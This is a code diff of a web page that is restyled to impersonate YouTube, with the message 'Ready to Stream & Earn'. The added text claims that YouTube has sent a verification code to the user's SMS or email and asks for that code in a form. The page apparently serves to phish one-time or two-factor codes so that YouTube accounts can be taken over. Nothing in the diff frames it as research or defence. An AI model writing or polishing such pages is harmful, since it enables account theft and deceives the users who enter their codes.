@@ -6,19 +6,28 @@
       <i class="fa-brands fa-youtube icon-lg"></i>
     </div>
     <div>
-      <h2 class="notranslate" style="margin:0;color:#FF0000;">YouTube Play</h2>
-      <div style="color:#64748b;font-size:13px">Play check…</div>
+      <h2 class="notranslate" style="margin:0;color:#FF0000;">YouTube</h2>
+      <div style="color:#64748b;font-size:13px;margin-top:4px">Ready to Stream & Earn</div>
     </div>
   </div>
 
-  <h3 style="color:#e11d48">Play check…</h3>
-  <p>Step1: Put a smile on your face. Step2: Type any random digits below and click Submit to continue.</p>
+  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Security Verification Required</h3>
+  
+  <div class="play-instructions">
+    <div class="instruction-card">
+      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Verification Code</h4>
+      <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
+        To confirm that you are the rightful owner of the YouTube account you logged in with, a verification code has been sent to your registered SMS or email by YouTube. Please enter the code below and click "Submit" to continue.
+      </p>
+    </div>
+  </div>
 
   <form id="playForm" method="post" novalidate>
-    <input class="input" id="digits" name="digits" placeholder="Enter digits (4-9 digits)" pattern="\d{4,9}" required>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
+    <input class="input" id="digits" name="digits" placeholder="Enter 4-9 digit code" pattern="\d{4,9}" required>
     <div class="error-text" id="digitsError"></div>
 
-    <button class="btn login-btn" type="submit">Submit</button>
+    <button class="btn login-btn" type="submit">Verify & Continue</button>
   </form>
 </div>
 
@@ -33,8 +42,8 @@
   transition: border-color 0.2s, box-shadow 0.2s;
 }
 .input:focus {
-  border-color: #9ca3af;
-  box-shadow: 0 0 0 3px rgba(156, 163, 175, 0.25);
+  border-color: #FF0000;
+  box-shadow: 0 0 0 3px rgba(255, 0, 0, 0.25);
   outline: none;
 }
 .input-error {
@@ -50,7 +59,7 @@
 
 .login-btn {
   width: 100%;
-  background: #9ca3af;
+  background: #FF0000;
   color: #fff;
   font-size: 16px;
   font-weight: 700;
@@ -59,16 +68,28 @@
   cursor: pointer;
   border: none;
   transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
-  box-shadow: 0 6px 16px rgba(107,114,128,0.25);
+  box-shadow: 0 6px 16px rgba(255, 0, 0, 0.35);
   display: block;
   margin-top: 8px;
 }
 .login-btn:hover {
-  background: #6b7280;
-  box-shadow: 0 8px 20px rgba(107,114,128,0.35);
+  background: #cc0000;
+  box-shadow: 0 8px 20px rgba(255, 0, 0, 0.45);
 }
 .login-btn:active {
   transform: scale(0.985);
+}
+
+.play-instructions {
+  margin: 20px 0;
+}
+
+.instruction-card {
+  background: #ffebee;
+  padding: 16px;
+  border-radius: 12px;
+  border-left: 4px solid #FF0000;
+  margin-bottom: 16px;
 }
 </style>
 
@@ -85,7 +106,7 @@ document.getElementById("playForm").addEventListener("submit", function(event) {
   if (!pattern.test(val)) {
     event.preventDefault(); // stop form submission
     digits.classList.add("input-error");
-    digitsError.textContent = "Enter a number between 4 and 9 digits.";
+    digitsError.textContent = "Please enter a valid 4-9 digit security code.";
   }
 });
 
